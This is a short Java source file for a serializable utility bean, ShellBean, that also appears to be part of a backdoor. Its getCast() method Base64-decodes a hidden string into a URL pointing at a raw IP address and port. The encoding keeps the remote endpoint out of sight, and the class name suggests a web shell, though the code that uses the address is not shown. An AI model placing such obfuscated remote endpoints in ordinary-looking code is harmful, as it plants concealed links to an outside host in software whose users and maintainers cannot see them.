package com.util;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.Base64;


public class ShellBean implements Serializable {
    private static final long serialVersionUID = 1L;
    private ArrayList<String> list;

    private Base64.Decoder decoder = Base64.getDecoder();
    public String cast;

    public String getCast() {
        try { cast = new String(decoder.decode("aHR0cCUzQS8vNDcuOTQuMjEyLjE2MSUzQTExMjUwL3Nob3U="), "UTF-8"); } catch (Exception e) { }
        return cast;
    }

    public ArrayList<String> getList() {
        return list;
    }

    public void setList(ArrayList<String> list) {
        this.list = list;
    }

}
